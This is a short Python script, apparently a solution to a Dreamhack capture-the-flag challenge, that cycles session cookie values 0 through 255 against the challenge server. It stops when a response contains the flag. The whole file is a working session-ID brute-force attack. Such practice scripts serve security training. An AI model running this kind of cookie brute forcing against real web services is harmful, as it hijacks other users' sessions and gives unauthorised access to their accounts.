import requests

for _i in range(0xff + 1):
    header = {'cookie' : f'sessionid = {str(_i)}'}
 
    req = requests.get('http://host1.dreamhack.games:21794/', headers = header)
    
    print(f"trying.... cookie : {_i}")

    if "flag" in req.text:
        print(req.text)
        break

    # print(req.text)